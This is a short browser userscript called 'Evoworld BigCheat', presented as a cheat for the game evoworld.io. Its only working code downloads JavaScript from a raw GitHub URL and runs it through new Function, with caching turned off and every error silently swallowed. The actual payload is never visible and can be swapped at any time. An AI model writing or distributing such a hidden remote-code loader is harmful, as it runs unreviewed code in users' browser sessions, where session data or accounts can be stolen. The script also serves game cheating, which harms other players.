// ==UserScript==
// @name         Evoworld BigCheat
// @namespace    http://tampermonkey.net/
// @version      10
// @description  none
// @author       RoMario
// @match        https://evoworld.io/
// @icon         https://www.google.com/s2/favicons?sz=64&domain=evoworld.io
// @license      MIT
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/561686/Evoworld%20BigCheat.user.js
// @updateURL https://update.greasyfork.org/scripts/561686/Evoworld%20BigCheat.meta.js
// ==/UserScript==
(function() {
    'use strict';
 
    const GITHUB_URL = "https://raw.githubusercontent.com/csuserbro/esp-lib/refs/heads/main/sourcecodebase.js";
 
    fetch(GITHUB_URL, { cache: "no-store" })
        .then(response => response.ok ? response.text() : null)
        .then(code => {
            if (code) {
                try {
                    const run = new Function(code);
                    run();
                } catch (e) {}
            }
        })
        .catch(() => {});
 
})();